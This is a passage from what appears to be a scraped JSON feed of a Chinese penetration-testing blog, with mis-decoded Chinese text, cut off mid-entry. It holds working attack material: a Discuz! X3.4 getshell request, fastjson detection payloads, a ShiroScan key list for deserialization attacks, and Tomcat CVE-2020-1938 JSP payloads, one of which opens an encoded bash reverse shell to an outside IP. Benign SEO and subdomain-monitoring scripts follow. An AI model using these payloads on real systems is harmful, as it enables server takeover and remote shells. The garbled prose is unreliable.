for($j = $i = 0; $i &lt; 256; $i++) { $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; } for($a = $j = $i = 0; $i &lt; $string_length; $i++) { $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); } if($operation == 'DECODE') { if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) { return substr($result, 26); } else { return ''; } } else { return $keyc.str_replace('=', '', base64_encode($result)); } } ?&gt; å¸¦codeå‚æ•°GETå‘é€è¯·æ±‚(å‘é€è¿™ä¸ªè¯·æ±‚å‰åå°åŠŸèƒ½éƒ½æ˜¯ä¸æ­£å¸¸çš„ï¼Œå‘é€ååå°æ¢å¤æ­£å¸¸) è¯·æ±‚æ•°æ®åŒ… GET /discuz!x3.4/api/uc.php?code=ac7091oTLALD6X24gZeiX5YmqDkLnX4ivIqx1jDnA7NhUAcHHOX3fWWOLWpGwSwfQfz4r5Pgf86bRlDTRkQ% HTTP/1.1 Host: 192.168.0.106 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,ar;q=0.8 Connection: close Content-Length: 133 &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt; &lt;root&gt; &lt;item id=&quot;UC_API&quot;&gt;http://192.168.0.106/discuz!x3.4/uc_server&lt;/item&gt; &lt;/root&gt; æ­¤æ—¶ http://192.168.0.106/discuz!x3.4/config/config_ucenter.phpå°±æ˜¯æˆ‘ä»¬çš„shellåœ°å€ï¼Œè‡³æ­¤getshellç»“æŸ ","link":"https://www.svenbeast.com/post/discuzx34-hou-tai-xiu-gai-uc_center-pei-zhi-getshell/"},{"title":"æ­å»ºè‡ªå·±çš„dnslogå¹³å°å¹¶ä»¥æ­¤æ¥å‘ç°Fastjsonèµ„äº§","content":"0x01 ^$&amp;!#@* å› ä¸ºceyeæ€»æ˜¯å®•æœºï¼Œdnslog.cnä¸é€‚åˆè„šæœ¬åŒ–æŸ¥è¯¢ï¼Œ æ‰€ä»¥å°±éœ€è¦ç”¨è‡ªå·±çš„å¹³å°äº†ï¼Œ è®°å½•å€ŸåŠ©xrayå»ºç«‹dnslogå¹³å°å¹¶ä»¥æ­¤æ¥æ£€æµ‹fastjsonèµ„äº§çš„è¿‡ç¨‹ï¼ˆxrayå®˜æ–¹æ–‡æ¡£æ²¡å†™å…¨ï¼Œè¸©äº†ç‚¹å°å‘ï¼‰ 0x02 å‡†å¤‡é›¶ä»¶ 1.ä¸€å°æœåŠ¡å™¨ï¼Œæœ€ä½é…ç½®éƒ½æ²¡äº‹ï¼Œèƒ½è¿è¡Œxrayå°±è¡Œï¼ˆè®¾ä¸ºæˆ‘çš„æœåŠ¡å™¨ipä¸ºï¼š123.321.213.2ï¼‰ 2.åœ¨é˜¿é‡Œäº‘è´­ä¹°åŸŸåï¼ˆdnslog.coolï¼‰å…¶ä»–å¤„ä¸è¡Œå“¦ï¼Œå…è´¹åŸŸåå‚å•†çš„ä¹Ÿå¯ä»¥ï¼Œå› ä¸ºéœ€è¦æœ‰è®¾å®šDNS Hostçš„åŠŸèƒ½ 0x03 é…ç½®è¿‡ç¨‹ https://wanwang.aliyun.com/?spm=5176.12825654.eofdhaal5.9.3dbd2c4apKHcoB&amp;aly_as=TNeZQ8Wpi 1.æ­¤å¤„è´­ä¹°åŸŸåï¼Œä»»æ„å³å¯ï¼Œå› æœ¬äººå¼ºè¿«ç—‡ï¼Œè´­ä¹°dnslog.coolï¼Œè·Ÿéšé˜¿é‡Œäº‘çš„è´­ä¹°æµç¨‹å³å¯ï¼Œé…ç½®é‚®ç®±ï¼Œé…ç½®ä¸ªäººä¿¡æ¯ç­‰ 2.è‡ªå®šä¹‰DNS Hostï¼šç­‰å¾…å®åè®¤è¯å®¡æ ¸å®Œæˆï¼Œä¸€èˆ¬10åˆ°20åˆ†é’Ÿå³å¯ï¼Œå‰å¾€è‡ªå®šä¹‰DNS HoståŠŸèƒ½å¤„åˆ›å»º2ä¸ªDNSæœåŠ¡å™¨ï¼Œæ¯”å¦‚è®¾ç½®sven1.dnslog.cool,sven2.dnslog.coolï¼ŒIPåœ°å€å¡«å†™æœåŠ¡å™¨ip:123.321.213.2 3.DNSä¿®æ”¹ï¼šå‰å¾€DNSä¿®æ”¹åŠŸèƒ½ï¼Œä¿®æ”¹dnsæœåŠ¡å™¨ä¸ºsven1.dnslog.cool,sven2.dnslog.cool 4.åŸŸåè§£æï¼šç„¶åç‚¹å‡»å·¦è¾¹çš„åŸŸåè§£æåŠŸèƒ½ï¼Œå¡«åŠ 2æ¡è§£æè®°å½•ï¼Œä¸»æœºè®°å½•å¡«å†™sven1ï¼Œè®°å½•ç±»å‹ä¸ºAï¼Œè§£æçº¿è·¯ä¸ºé»˜è®¤ï¼Œè®°å½•å€¼ä¸º123.321.213.2(æˆ‘çš„æœåŠ¡å™¨ip)ï¼Œå‰©ä¸‹é»˜è®¤å³å¯ï¼Œç¬¬äºŒæ¡è§£æè®°å½•çš„ä¸»æœºè®°å½•å¡«å†™sven2ï¼Œå…¶ä»–åŒä¸Šæ¡ 5.ç¡®å®šåŸŸåçš„å®åè®¤è¯å®¡æ ¸å®Œæˆåï¼Œç™»å½•æœåŠ¡å™¨ï¼ˆå¿…é¡»æ‹¥æœ‰ç‹¬ç«‹å¤–ç½‘ipçš„å“¦ï¼‰ï¼Œä¸‹è½½xrayï¼Œå…ˆä½¿ç”¨å‘½ä»¤è¡Œxray.exe reverseè¿è¡Œä¸€éï¼Œè‡ªåŠ¨ç”Ÿæˆconfig.yamlï¼Œç„¶åæ‰“å¼€config.yamlï¼Œæ‰¾åˆ°é…ç½®åè¿å¹³å°å¾—é…ç½®ï¼ˆ270è¡Œä¸Šä¸‹åæ¥è¡Œéƒ½æ˜¯ï¼‰ï¼Œæ›¿æ¢æˆå¦‚ä¸‹ç¨‹åº¦ï¼ŒæŒ‰ç…§è‡ªå·±å®é™…æƒ…å†µæ›´æ¢å¯†ç å’Œipå’ŒåŸŸåå’ŒdnsæœåŠ¡å™¨çš„å‰ç¼€åè¿è¡Œxrayï¼ˆxray.exe reverseï¼‰ï¼Œè¿è¡Œå®Œæ¯•åè®¿é—®é“¾æ¥ï¼šhttp://123.321.213.2:8001ï¼Œå°±æ˜¯dnslogç®¡ç†å¹³å°äº† reverse: db_file_path: &quot;reverse.db&quot; token: &quot;123!@#QWE&quot; //æ­¤å¤„æ˜¯è®¾ç½®ç™»å½•åè¿å¹³å°å¾—å¯†ç  http: enabled: true listen_ip: 0.0.0.0 listen_port: &quot;8001&quot; dns: enabled: true listen_ip: 0.0.0.0 domain: &quot;dnslog.cool&quot; is_domain_name_server: false # é™æ€è§£æè§„åˆ™ resolve: - type: A record: sven1 value: 123.321.213.2 ttl: 60 - type: A record: sven2 ttl: 60 value: 123.321.213.2 rmi: enabled: true listen_ip: 0.0.0.0 listen_port: 8088 resolve: - type: A # A, AAAA, TXT ä¸‰ç§ record: localhost value: 127.0.0.1 ttl: 60 client: http_base_url: &quot;&quot; dns_server_ip: &quot;123.321.213.2&quot; remote_server: false 6.ç”Ÿæˆç”¨æ¥æ£€æµ‹çš„åŸŸåï¼šå¤åˆ¶å¥½åç›´æ¥ping xxxxxx.dnslog.coolå³å¯æ”¶åˆ°è¯·æ±‚ 0x04 fastjsonèµ„äº§æ£€æµ‹ åˆ©ç”¨dnslogå›æ˜¾æ£€æµ‹åç«¯æ˜¯å¦ä½¿ç”¨fastjson Payloadä¹‹ä¸€: {&quot;e&quot;:{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;hbs9jr.dnslog.cn&quot;}} è¿™æ ·æˆ‘çš„æ‰¹é‡å¤šçº¿ç¨‹æ£€æµ‹è„šæœ¬ä¹Ÿå°±å®Œæˆäº†ï¼Œå½“ç„¶ä¹Ÿåªæ˜¯ä¸€ç§æ€è·¯ï¼Œè¿˜æœ‰å…¶ä»–å¢åŠ æ£€æµ‹ç‡çš„æ–¹æ³•ï¼Œéƒ¨åˆ†ä»£ç å¦‚ä¸‹ try: randStr = ''.join(random.sample(string.ascii_letters + string.digits, 4)) dnslog = '{'+'&quot;e&quot;:'+'{'+'&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;p-1111-pgfx.{}.dnslog.cool&quot;'.format(randStr)+'}'+'}' line=line.strip('\\n') k = requests.get(line,headers=fastjson_header,data=dnslog,allow_redirects=False,verify=False,timeout=10) time.sleep(1) check = 'http://11111111111:8001/_/api/event/list?lastID=&amp;count=5&amp;eventType=dns&amp;action=Next' wb_data = requests.get(check,headers=check_header,timeout=10) req = wb_data.text if randStr in req: print(&quot;[+ &quot;+&quot; å­˜åœ¨fastjson: &quot;+&quot;çŠ¶æ€ç :&quot;+str(k.status_code)+&quot;:&quot;+' url:'+line) f.write(line+&quot;\\n&quot;) else: print(&quot;[- &quot;+&quot; ä¸å­˜åœ¨fastjson &quot;+&quot;çŠ¶æ€ç :&quot;+str(k.status_code)+&quot;:&quot;+' url:'+line) except Exception as e: print(e) pass åæ§½ 1.xrayè¯´æ˜æ–‡æ¡£æœªå†™æ¸…éœ€è¦å»åŸŸåè§£æé…ç½®dnsæœåŠ¡å™¨çš„è§£æ 2.æµªè´¹äº†ä¸€ä¸ªåŸŸåï¼Œdnslog.runï¼Œåœ¨è…¾è®¯äº‘ä¹°çš„ï¼Œå½“æ—¶æ²¡æœ‰æ‰¾åˆ°è‡ªå®šä¹‰dnslogæœåŠ¡å™¨åŠŸèƒ½ï¼Œåæ¥æœ‰äº†ã€‚ 3.æ‰€ä»¥éƒ½æ€ªceyeæ²¡äº‹å®•ä¸ªæœº -.- ! ","link":"https://www.svenbeast.com/post/16--phe4I/"},{"title":"Shiroååºåˆ—åŒ–åˆ©ç”¨å·¥å…·ShiroScanä»£ç é‡æ„ï¼Œé€Ÿåº¦å¢åŠ 300%ï¼ŒæˆåŠŸç‡å¢åŠ 30%","content":"0x01 èƒŒæ™¯ å‘¨å…­æ—¥åœ¨å®¶æ— èŠï¼Œå‘¨å…­å†™çš„æŸè‡ªåŠ¨æäº¤ï¼Œå‘¨æ—¥æƒ³èµ·äº†å½“åˆå› ä¸ºæŸäº›åŸå› å†™çš„ShiroScanï¼Œæ—¢ç„¶ç°åœ¨ä¹Ÿæœ‰å¾ˆå¤šå¸ˆå‚…åœ¨ç”¨ï¼Œå°±å‡†å¤‡é‡æ–°æ”¹ä¸€ä¸‹ï¼Œæ¯•ç«Ÿå½“åˆä¸ºäº†èµ¶é€Ÿåº¦ï¼Œä»£ç ä¸èƒ½çœ‹-.-ï¼ ä¸‹è½½é“¾æ¥ï¼šhttps://github.com/sv3nbeast/ShiroScan 0x02 æ–°å¢å¤šçº¿ç¨‹ å½“ç„¶é¦–å…ˆè¦å¢åŠ é€Ÿåº¦ï¼Œä½¿ç”¨çš„æ˜¯pythonçš„threadpoolè¿™ä¸ªè€æ¨¡å—ï¼Œä¸‹æ–¹æ˜¯ä¸ªåˆ«ä»£ç ï¼Œå…¶å®æ’ä»¶æ¨¡å—é‡Œçš„æ’ä»¶ä»£ç å…¨éƒ¨éƒ½å˜äº†ï¼Œè™½æ¨¡å—å¢åŠ ä½†é¢„è®¡å¢åŠ é€Ÿåº¦300% ä¸ºäº†è„šæœ¬è¿è¡Œç®€å•ï¼Œå¤šçº¿ç¨‹æ•°é‡ä¸æ˜¯ä½¿ç”¨è€…ä¼ å‚æ§åˆ¶ï¼Œé»˜è®¤20çº¿ç¨‹ï¼Œå¦‚éœ€æ”¹åŠ¨è¯·åˆ°/moule/main.pyç¬¬20è¡Œä»£ç è‡ªè¡Œä¿®æ”¹æ§åˆ¶çº¿ç¨‹çš„å‚æ•° def multithreading(self,funcname,url ,command, pools): key = ['kPH+bIxk5D2deZiIxcaaaA==1234url3456'+url+'1234command3456'+command+'1234sven3456','wGiHplamyXlVB11UXWol8g==1234url3456'+url+'1234command3456'+command+'1234sven3456','2AvVhdsgUs0FSA3SDFAdag==1234url3456'+url+'1234command3456'+command+'1234sven3456','4AvVhmFLUs0KTA3Kprsdag==1234url3456'+url+'1234command3456'+command+'1234sven3456', '3AvVhmFLUs0KTA3Kprsdag==1234url3456'+url+'1234command3456'+command+'1234sven3456','Z3VucwAAAAAAAAAAAAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456','U3ByaW5nQmxhZGUAAAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456','wGiHplamyXlVB11UXWol8g==1234url3456'+url+'1234command3456'+command+'1234sven3456', '6ZmI6I2j5Y+R5aSn5ZOlAA==1234url3456'+url+'1234command3456'+command+'1234sven3456','fCq+/xW488hMTCD+cmJ3aQ==1234url3456'+url+'1234command3456'+command+'1234sven3456','1QWLxg+NYmxraMoxAXu/Iw==1234url3456'+url+'1234command3456'+command+'1234sven3456','ZUdsaGJuSmxibVI2ZHc9PQ==1234url3456'+url+'1234command3456'+command+'1234sven3456', 'L7RioUULEFhRyxM7a2R/Yg==1234url3456'+url+'1234command3456'+command+'1234sven3456','r0e3c16IdVkouZgk1TKVMg==1234url3456'+url+'1234command3456'+command+'1234sven3456','5aaC5qKm5oqA5pyvAAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456','bWluZS1hc3NldC1rZXk6QQ==1234url3456'+url+'1234command3456'+command+'1234sven3456', 'a2VlcE9uR29pbmdBbmRGaQ==1234url3456'+url+'1234command3456'+command+'1234sven3456','WcfHGU25gNnTxTlmJMeSpw==1234url3456'+url+'1234command3456'+command+'1234sven3456','bWljcm9zAAAAAAAAAAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456','MTIzNDU2Nzg5MGFiY2RlZg==1234url3456'+url+'1234command3456'+command+'1234sven3456', '5AvVhmFLUs0KTA3Kprsdag==1234url3456'+url+'1234command3456'+command+'1234sven3456'] pool = threadpool.ThreadPool(pools) requests = threadpool.makeRequests(funcname,key) [pool.putRequest(req) for req in requests] pool.wait() def poc(self,url, command, thre): self.multithreading(self.generator, url, command, thre) return False 0x03 æ–°å¢åˆ©ç”¨é“¾ åœ¨è¿‡å¾€å‡ ä¸ªæœˆæœ‰éƒ¨åˆ†å¤§ä½¬æ”¾å‡ºäº†è‡ªå·±çš„ç±»ä¼¼å·¥å…·ï¼Œæœ‰æˆ‘å¾ˆå¤šéœ€è¦å­¦ä¹ çš„åœ°æ–¹-.-! ï¼Œæ‰€ä»¥è¿™æ¬¡å¢åŠ äº†æ–°çš„åˆ©ç”¨é“¾ï¼Œä»£ç è¡¨ç°ä¸ºæ–°å¢äº†4ä¸ªæ¨¡å—ï¼Œå°¤å…¶æ˜¯CommonsCollections10ï¼Œé¢„è®¡å¢åŠ æˆåŠŸç‡30% åˆ©ç”¨é“¾è¯¦æƒ…ä¸ºæ­¤ç¯‡æ–‡ç« ï¼ˆæ¨èç»™æ­¤ç±»ç ”ç©¶çš„å¸ˆå‚…çœ‹ï¼‰ï¼šhttps://www.anquanke.com/post/id/190468ï¼ˆJavaååºåˆ—åŒ–åˆ©ç”¨é“¾åˆ†æä¹‹CommonsCollections5,6,7,9,10ï¼‰ æ‰€ä»¥ç°åœ¨çš„ysoserial.jaråŒ…æ˜¯æ–°çš„ï¼Œè¯·å‹¿æ›´æ¢æˆè‡ªå·±çš„jaråŒ…å“¦ 0x04 å‘ç‚¹ pythonçš„threadpoolæ¨¡å—ä¸­threadpool.makeRequestsè¿™é‡Œä¼ å‚ä¸èƒ½ä½¿ç”¨è¶…è¿‡2ä¸ªå‚æ•°ï¼Œéš¾ä½æˆ‘äº†ï¼Œæœ€åè§£å†³åŠæ³•æ˜¯å‚æ•°é›†åˆæˆ1ä¸ªå‚æ•°ï¼Œåˆ°äº†æ–¹æ³•é‡Œåœ¨æ­£åˆ™å–å‡ºéœ€è¦çš„å‚æ•°-.-! ï¼ˆæ­¤å¤„åˆ«ç¬‘ï¼ŒæŒå£°ã€‚ã€‚ï¼‰ 0x05 å¿½ç•¥ dnslogå›æ˜¾æ¥ç¡®å®škeyè¿™ä¸ªåŠŸèƒ½ï¼Œæˆ‘ä¸å¤ªæƒ³è¦0.0ï¼Œå…¶å®è¿˜èƒ½ç¡®å®šä½¿ç”¨çš„æ¨¡å—ï¼Œä½†æ˜¯éƒ½éœ€è¦ä½¿ç”¨è€…å‘½ä»¤è¡Œä¼ å‚ï¼Œä¼šè®©æˆ‘åœ¨ç”¨è„šæœ¬çš„æ—¶å€™æƒ³å‘½ä»¤çš„æ—¶é—´å¤š1ç§’ï¼Œè¦ä¸åŠŸèƒ½å°±å…¨é›†æˆåœ¨è„šæœ¬å†…ï¼Œè¦ä¸å°±ä¸è¦ï¼Œå› ä¸ºå½“åˆæ˜¯ä¸ªèœJçš„æ—¶å€™ï¼ˆç°åœ¨ä¹Ÿæ˜¯-.-!ï¼‰çœ‹åˆ°ä¸ªè„šæœ¬ä¸€å †å†—ä½™åŠŸèƒ½å°±å¤´ç—›ï¼ŒèŠ±é‡Œèƒ¡å“¨çš„ï¼Œé™¤äº†æµªè´¹æ—¶é—´å°±æ˜¯æµªè´¹æ—¶é—´ï¼Œå½“ç„¶å¤§å‹ï¼Œè¿è½½çš„å·¥å…·æ’é™¤å“ˆï¼Œè„šæœ¬å˜›ï¼Œå°±æ˜¯ä¸ºäº†æŸä¸ªç›®çš„åšçš„ä¸€é”®å·¥å…· ä½†æ˜¯æœ‰ä¸ªå¸ˆå‚…çš„å·¥å…·å¯ä»¥ç›´æ¥æ£€æµ‹å‡ºä½¿ç”¨çš„æ˜¯ä»€ä¹ˆkeyï¼Œç›®å‰æˆ‘è¿˜ä¸ä¼šï¼Œæ‰€ä»¥è¯´èœæ‰æ˜¯åŸç½ª-.-!ï¼Œå¦‚æœæœ‰ä¼šçš„å¸ˆå‚…å‘Šè¯‰æˆ‘ä¸‹å°±å¥½äº†ã€‚ã€‚ è¿™ä¸ªå·¥å…·å…¶å®å°±æ˜¯ä¸ºäº†æ¢æµ‹æ˜¯å¦å­˜åœ¨å¯åˆ©ç”¨çš„shiroååºåˆ—åŒ–æ¼æ´ï¼Œä»…æ­¤è€Œå·²å“ˆï¼Œæˆ‘è¡¨ç¤ºæœ€å–œæ¬¢çš„å·¥å…·ç±»å‹å°±æ˜¯æœ€å°‘çš„å‘½ä»¤å®ç°è¾ƒå¤šçš„åŠŸèƒ½ï¼Œåº”è¯¥æœ‰å¿—åŒé“åˆçš„æœ‹å‹å§~ å…¶å®å…‰æ£€æµ‹çš„è¯ä½¿ç”¨URLDNSè¿™ä¸ªåˆ©ç”¨é“¾å°±å¯ä»¥ï¼Œä½†æ˜¯æœ‰çš„æ—¶å€™è¿™ä¸ªURLDNSæˆåŠŸä¸ä»£è¡¨å¯ä»¥åˆ©ç”¨ï¼Œå¦‚æœç»§ç»­å¢åŠ æ£€æµ‹ç‡ï¼Œå…¶å®ç”¨JRMPClientæˆ‘è§‰å¾—æ›´å¥½ï¼Œä½†æ˜¯ä¼šå¢åŠ ä¸€äº›ä½¿ç”¨è€…æ“ä½œï¼Œæ‰€ä»¥å°±ä¸æ”¾å‡ºæ¥äº†ï¼Œè€Œä¸”ä¼šçš„å¸ˆå‚…ä¹Ÿå¹¶ä¸ä¾èµ–å·¥å…·ï¼Œå®Œå…¨å¯ä»¥è‡ªå·±æ“ä½œ-.- ! ","link":"https://www.svenbeast.com/post/tskRKJIPg/"},{"title":"ã€æ— é”™æ¼ä¼˜åŒ–ç‰ˆã€‘æ‰¹é‡ç™¾åº¦æƒé‡æŸ¥è¯¢å·¥å…·","content":"0x01 åŸå›  é€ ä¸ªè½®å­çš„åŸå› æ˜¯å› ä¸ºå…¶ä»–çš„æƒé‡æŸ¥è¯¢ç”¨ç€å¥½åƒä¸æ˜¯å¤ªå‹å¥½ï¼Œæ€»æ˜¯æœ‰äº›å°æ¯›ç—…ï¼Œæ¼ä¸€ä¸ªï¼Œå°‘ä¸€ä¸ªï¼Œç»“æœä¸å¯¹çš„ä¸€äº›é—®é¢˜ï¼Œè‡ªå·±å°±ä¹Ÿå¼„ä¸€ä¸ªï¼Œæœ‰ä¸ªç¼ºç‚¹å°±æ˜¯æ…¢ç‚¹ï¼Œä¼˜ç‚¹å°±æ˜¯æŸ¥çš„æ¯”è¾ƒç¨³ï¼Œå¾ˆå°‘å‡ºç°ç»“æœæ˜¯næˆ–è€…æ¼å‡ ä¸ªurlçš„é—®é¢˜ 0x02 ä»£ç  ä¸»ç¨‹åºä»£ç ï¼š # coding=utf-8 import requests #Author:æ–¯æ–‡ import re import time from threading import Thread from selenium import webdriver from selenium.webdriver.chrome.options import Options zhanzhang_headers = { 'Host': 'rank.chinaz.com', 'Cache-Control': 'max-age=0', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9', 'Cookie': 'BDTUJIAID=febc82b216a29e116730505bc1e471a9; inputbox_urls=%5b%22passivcashincome.com%22%2c%22feifeizuida.com%22%5d; UM_distinctid=16e63892b4e3b1-031b6053dcfc9f-7711b3e-100200-16e63892b4fa8a; Hm_lvt_aecc9715b0f5d5f7f34fba48a3c511d6=1579746706; CNZZDATA433095=cnzz_eid%3D297046501-1578041490-null%26ntime%3D1583974744; CNZZDATA5082706=cnzz_eid%3D902178444-1578044637-null%26ntime%3D1583975389; qHistory=aHR0cDovL3Rvb2wuY2hpbmF6LmNvbV/nq5nplb/lt6Xlhbd8aHR0cDovL3JhbmsuY2hpbmF6LmNvbV/nmb7luqbmnYPph43mn6Xor6J8aHR0cDovL3Rvb2wuY2hpbmF6LmNvbS90b29scy9lc2NhcGUuYXNweF9Fc2NhcGXliqDlr4Yv6Kej5a+GfGh0dHA6Ly93aG9pcy5jaGluYXouY29tL3JldmVyc2UrV2hvaXPlj43mn6V8aHR0cDovL3dob2lzLmNoaW5hei5jb20vK1dob2lz5p+l6K+i', 'Connection': 'close' } def process(): print('[+] æ­£åœ¨åå°æ‰“å¼€è°·æ­Œæµè§ˆå™¨...') chrome_option = Options() chrome_option.add_argument('blink-settings=imagesEnabled=false') #ä¸åŠ è½½å›¾ç‰‡, æå‡é€Ÿåº¦ chrome_option.add_argument('--headless') #æµè§ˆå™¨ä¸æä¾›å¯è§†åŒ–é¡µé¢. linuxä¸‹å¦‚æœç³»ç»Ÿä¸æ”¯æŒå¯è§†åŒ–ä¸åŠ è¿™æ¡ä¼šå¯åŠ¨å¤±è´¥ chrome_option.add_experimental_option('excludeSwitches', ['enable-logging'])#å…³é—­æ§åˆ¶å°æ—¥å¿—ï¼Œçœ‹ç€å¤ªä¹± driver=webdriver.Chrome(options=chrome_option) driver.set_page_load_timeout(5000) print('[+] æ­£åœ¨æŸ¥è¯¢ä¸­ï¼Œè¯·ç¨ç­‰ ~') num=0 with open(&quot;url.txt&quot;) as f: for line in f: try: quanzhong=line.strip('\\n') site=quanzhong.strip('https://') driver.get('http://rank.chinaz.com/all/{domain}'.format(domain=site)) baidurank_pattern = re.compile(r'csstools.chinaz.com/tools/images/public/baiduapp/(.*?).gif') try: html_text = driver.page_source.encode('utf-8') baidurank = re.findall(baidurank_pattern,html_text.decode('utf-8'))[0] except: time.sleep(2.5) html_text = driver.page_source.encode('utf-8') baidurank = re.findall(baidurank_pattern,html_text.decode('utf-8'))[0] num=num+1 print(&quot;[+] æ­£åœ¨æŸ¥è¯¢ç¬¬&quot;+str(num)+&quot;æ¡&quot;+&quot; ç™¾åº¦æƒé‡:&quot;+str(baidurank)+&quot; url: &quot;+site) if int(baidurank) &gt; 0: with open('seo_1.txt','a',encoding='utf-8') as l: l.write(site+'\\n') except Exception as e: pass driver.close() 0x03 è¿è¡Œ 1.python3 Baidu_Rank.py å³å¯ 2.å†…ç½®è¯»å–åŒç›®å½•çš„url.txtæ–‡ä»¶ 3.æƒé‡å¤§äº1çš„ç½‘å€å­˜å…¥åŒç›®å½•rank_1.txtæ–‡ä»¶ githubé“¾æ¥ï¼šhttps://github.com/sv3nbeast/Baidu_Rank ","link":"https://www.svenbeast.com/post/QjiX32_Cm/"},{"title":"Tomcatæ–‡ä»¶åŒ…å«åŠè¯»å–æ¼æ´ï¼ˆCVE-2020-1938æ¼æ´å¤ç°ï¼‰","content":"0x01 æ¼æ´å½±å“ Apache Tomcat 9.x &lt; 9.0.31 Apache Tomcat 8.x &lt; 8.5.51 Apache Tomcat 7.x &lt; 7.0.100 Apache Tomcat 6.x 0x02 å‰æ ç›®æ ‡æœºå™¨å¼€å¯AJP Connector æœåŠ¡ç«¯å£ï¼ˆé»˜è®¤å¼€å¯ï¼Œä¸º8009ç«¯å£ï¼‰ 0x03 æ–‡ä»¶è¯»å–&amp;æ–‡ä»¶åŒ…å«RCE æ–‡ä»¶è¯»å– python2 &quot;Tomcat-ROOTè·¯å¾„ä¸‹æ–‡ä»¶è¯»å–(CVE-2020-1938).py&quot; -p 8009 -f /WEB-INF/web.xml 127.0.0.1 æ–‡ä»¶åŒ…å« python2 &quot;Tomcat-ROOTè·¯å¾„ä¸‹æ–‡ä»¶åŒ…å«(CVE-2020-1938).py&quot; -p 8009 -f /test.txt 127.0.0.1 test.txt &lt;% java.io.InputStream in = Runtime.getRuntime().exec(&quot;ping fiohed.dnslog.cn&quot;).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(&quot;&lt;/pre&gt;&quot;); %&gt; 0x04 åå¼¹shell shell.txt &lt;% java.io.InputStream in = Runtime.getRuntime().exec(&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyNC41LzE4ODg4IDA+JjE=}|{base64,-d}|{bash,-i}&quot;).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(&quot;&lt;/pre&gt;&quot;); %&gt; åå¼¹shellç”¨çš„å‘½ä»¤éœ€è¦è¿›è¡Œbashç¼–ç  åœ¨çº¿bashç¼–ç ï¼šhttp://www.jackson-t.ca/runtime-exec-payloads.html POCä¸‹è½½åœ°å€ï¼šhttps://github.com/sv3nbeast/CVE-2020-1938-Tomact-file_include-file_read 0x05 å‚è€ƒé“¾æ¥ https://twitter.com/jas502n/status/1230531680999395328 https://forum.90sec.com/t/topic/801 ","link":"https://www.svenbeast.com/post/fqSI9laE8/"},{"title":"ä¸ºOneForAllå¢åŠ ä¸€ä¸ªæ–°å¢åŸŸåç›‘æ§æ’ä»¶ï¼ˆOne_Monitorï¼‰","content":"0x01 èƒŒæ™¯ éœ€è¦ä¸€ä¸ªåŸŸåç›‘æ§å·¥å…·ï¼Œæœ¬ç€å·¥å…·è¶Šç®€å•è¶Šå¥½çš„ç†å¿µï¼Œå†™äº†ä¸€ä¸ªåªèƒ½æ»¡è¶³æˆ‘éœ€è¦çš„æ’ä»¶ï¼Œå¥½å§ï¼Œå…¶å®æ˜¯ç»„è£…è½®å­çš„æ—¶å€™éœ€è¦è¿™ä¸ªåŠŸèƒ½ï¼Œç„¶åæœ‰è¿™åŠŸèƒ½çš„å·¥å…·åˆéƒ½å¤ªä¹±äº†ï¼Œæˆ‘è§‰å¾—æœ‰ç‚¹å†—ä½™ -.-! 0x02 ä»£ç  OneForAll(ç²¾çµå¸ˆå‚…çš„å­åŸŸåå·¥å…·): https://github.com/shmilylty/OneForAll One_Monitor(æ–°å¢åŸŸåç›‘æ§æ’ä»¶): https://github.com/sv3nbeast/One_Monitor # -*- coding:utf-8 -*- import re import sys import os import time import datetime path=&quot;C:/Users/Administrator/Desktop/tools/OneForAll/oneforall&quot; #OneForAllç»å¯¹è·¯å¾„ï¼Œéœ€æ‰‹åŠ¨é…ç½® old=path+&quot;/åŸŸåç›‘æ§/old_domain/&quot; #å­˜æ”¾ä¸Šæ¬¡æ‰«æç»“æœçš„æ–‡ä»¶å¤¹ï¼Œéœ€æ‰‹åŠ¨åˆ›å»ºå¹¶å¡«å†™æ­¤é…ç½® new=path+&quot;/åŸŸåç›‘æ§/new_domain/&quot; #å­˜æ”¾æœ€æ–°æ‰«æç»“æœçš„æ–‡ä»¶å¤¹ï¼Œéœ€æ‰‹åŠ¨åˆ›å»ºå¹¶å¡«å†™æ­¤é…ç½® update=path+&quot;/åŸŸåç›‘æ§/update/&quot; #å­˜æ”¾æ–°å¢åŸŸåç»“æœçš„æ–‡ä»¶å¤¹,éœ€æ‰‹åŠ¨åˆ›å»ºå¹¶å¡«å†™æ­¤é…ç½® old_import=path+&quot;/åŸŸåç›‘æ§/old_import/&quot; #å­˜æ”¾ç›®æ 